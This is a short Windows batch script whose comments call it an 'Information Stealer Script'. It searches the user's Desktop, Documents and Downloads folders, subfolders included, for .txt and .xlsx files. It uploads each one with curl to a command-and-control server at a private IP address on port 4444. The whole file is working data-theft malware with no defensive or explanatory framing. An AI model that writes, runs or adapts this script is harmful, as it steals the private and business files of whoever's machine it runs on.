@echo off
REM ============================================
REM Information Stealer Script
REM ============================================
REM This script searches for sensitive files (.txt and .xlsx)
REM in common user directories and uploads them to the C2 server.
REM Target folders: Desktop, Documents, Downloads (including subfolders)
REM ============================================

setlocal enabledelayedexpansion

REM Define target directories
set "desktopPath=%USERPROFILE%\Desktop"
set "documentPath=%USERPROFILE%\Documents"
set "downloadPath=%USERPROFILE%\Downloads"

REM C2 server URL for file upload
set "serverURL=192.168.174.131:4444/upload"

REM Search and upload all .txt and .xlsx files from Desktop and subfolders
for /r "%desktopPath%" %%f in (*.txt *.xlsx) do (
    echo Sending: %%f
    curl -X POST -F "file=@%%f" %serverURL%
)

REM Search and upload all .txt and .xlsx files from Documents and subfolders
for /r "%documentPath%" %%f in (*.txt *.xlsx) do (
    echo Sending: %%f
    curl -X POST -F "file=@%%f" %serverURL%
)

REM Search and upload all .txt and .xlsx files from Downloads and subfolders
for /r "%downloadPath%" %%f in (*.txt *.xlsx) do (
    echo Sending: %%f
    curl -X POST -F "file=@%%f" %serverURL%
)

exit
